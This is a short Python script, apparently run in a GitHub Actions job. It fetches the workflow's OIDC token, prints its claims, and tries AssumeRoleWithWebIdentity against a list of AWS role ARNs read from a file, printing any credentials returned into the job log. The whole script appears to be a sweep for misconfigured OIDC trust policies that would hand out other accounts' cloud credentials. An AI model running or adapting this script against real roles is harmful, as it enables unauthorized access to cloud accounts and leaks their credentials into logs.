import base64, datetime, json, os, urllib.error, urllib.parse, urllib.request

url = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
rt = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
req = urllib.request.Request(url + '&audience=sts.amazonaws.com', headers={'Authorization': 'bearer ' + rt})
tok = json.load(urllib.request.urlopen(req, timeout=20))['value']
p = tok.split('.')[1]
p += '=' * (-len(p) % 4)
claims = json.loads(base64.urlsafe_b64decode(p))
keys = ['iss','aud','sub','repository','repository_id','repository_owner','repository_owner_id','ref','event_name','job_workflow_ref','environment','repository_visibility']
print('CLAIMS ' + json.dumps({k: claims.get(k) for k in keys}, sort_keys=True))
print('TOKLEN %d' % len(tok))

for role in open('.github/roles14.txt'):
    role = role.strip()
    if not role:
        continue
    data = urllib.parse.urlencode({
        'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
        'RoleArn': role, 'RoleSessionName': 'w14b10', 'WebIdentityToken': tok}).encode()
    try:
        body = urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/', data=data), timeout=30).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    code = body.split('<Code>')[1].split('</Code>')[0] if '<Code>' in body else 'OK'
    hit = '<Credentials>' in body
    print('%s %s %s %s' % (datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'HIT' if hit else 'MISS', code, role))
    if hit:
        print('CREDENTIALS ' + role + ' ' + body[:3000])
